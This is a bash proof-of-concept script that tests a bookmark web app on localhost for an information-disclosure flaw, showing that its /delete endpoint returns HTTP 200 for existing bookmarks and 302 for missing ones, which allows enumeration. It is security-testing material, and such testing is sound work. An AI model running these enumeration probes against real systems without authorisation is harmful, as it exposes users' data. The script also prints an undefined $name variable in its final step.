#!/bin/bash

# POC: HTTP Status Code Information Disclosure in /delete Endpoint
# Demonstrates enumerating bookmark existence via status code differences
# HTTP 200 = bookmark exists (was deleted)
# HTTP 302 = bookmark doesn't exist (redirect)

TARGET_URL="http://localhost:5000"
COOKIES_FILE="/tmp/bookmark_cookies.txt"

echo "[*] HTTP Status Code Enumeration - Bookmark Existence Detection"
echo "[*] Target: $TARGET_URL/delete"
echo ""

# Step 1: First, login/access the list page to get a valid session
echo "[+] Step 1: Establishing authenticated session..."
curl -s -c "$COOKIES_FILE" "$TARGET_URL/list" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
  echo "[-] Failed to create session"
  exit 1
fi

echo "[+] Session established"
echo ""

# Step 2: Add a test bookmark to the session
echo "[+] Step 2: Adding a test bookmark to the session..."
curl -s -b "$COOKIES_FILE" -c "$COOKIES_FILE" \
  -X POST \
  -d "url=https://example.com&name=TestBookmark123" \
  "$TARGET_URL/add" > /dev/null

echo "[+] Test bookmark added"
echo ""

# Step 3: Verify the bookmark exists by checking the list
echo "[+] Step 3: Verifying bookmark exists in list..."
LIST_CONTENT=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/list")
if echo "$LIST_CONTENT" | grep -q "TestBookmark123"; then
  echo "[+] Bookmark confirmed in list"
else
  echo "[-] Warning: Bookmark not found in list, proceeding anyway"
fi
echo ""

# Step 4: Attempt to delete existing bookmark and capture status code
echo "[+] Step 4: Attempting to delete EXISTING bookmark (TestBookmark123)..."
RESPONSE=$(curl -s -i -b "$COOKIES_FILE" "$TARGET_URL/delete?name=TestBookmark123")
EXISTING_STATUS=$(echo "$RESPONSE" | head -1 | awk '{print $2}')

echo "[*] Full Response Header:"
echo "$RESPONSE" | head -5
echo ""
echo "[*] HTTP Status Code: $EXISTING_STATUS"

if [ "$EXISTING_STATUS" = "200" ]; then
  echo "[+] CONFIRMED: Bookmark exists - returned HTTP 200 (deletion successful)"
elif [ "$EXISTING_STATUS" = "302" ]; then
  echo "[-] Bookmark doesn't exist - returned HTTP 302"
else
  echo "[!] Unexpected status: $EXISTING_STATUS"
fi
echo ""

# Step 5: Attempt to delete non-existent bookmark
echo "[+] Step 5: Attempting to delete NON-EXISTENT bookmark (FakeBookmark999)..."
RESPONSE=$(curl -s -i -b "$COOKIES_FILE" "$TARGET_URL/delete?name=FakeBookmark999")
FAKE_STATUS=$(echo "$RESPONSE" | head -1 | awk '{print $2}')

echo "[*] Full Response Header:"
echo "$RESPONSE" | head -5
echo ""
echo "[*] HTTP Status Code: $FAKE_STATUS"

if [ "$FAKE_STATUS" = "302" ]; then
  echo "[+] CONFIRMED: Bookmark doesn't exist - returned HTTP 302 (redirect)"
elif [ "$FAKE_STATUS" = "200" ]; then
  echo "[!] Unexpected: Non-existent bookmark returned HTTP 200"
else
  echo "[!] Unexpected status: $FAKE_STATUS"
fi
echo ""

# Step 6: Compare status codes
echo "[+] Step 6: Status Code Comparison"
echo "=================================="
if [ "$EXISTING_STATUS" != "$FAKE_STATUS" ]; then
  echo "[+] VULNERABILITY CONFIRMED!"
  echo "[+] Status codes DIFFER between existing and non-existent bookmarks:"
  echo "    - Existing bookmark ($name): HTTP $EXISTING_STATUS"
  echo "    - Non-existent bookmark (FakeBookmark999): HTTP $FAKE_STATUS"
  echo "[+] This allows an attacker to enumerate which bookmarks exist"
  echo "[+] Information Disclosure Risk: HIGH"
else
  echo "[-] Status codes are consistent (HTTP $EXISTING_STATUS)"
  echo "[-] No enumeration vulnerability detected via status codes"
fi
echo ""

# Cleanup
rm -f "$COOKIES_FILE"

exit 0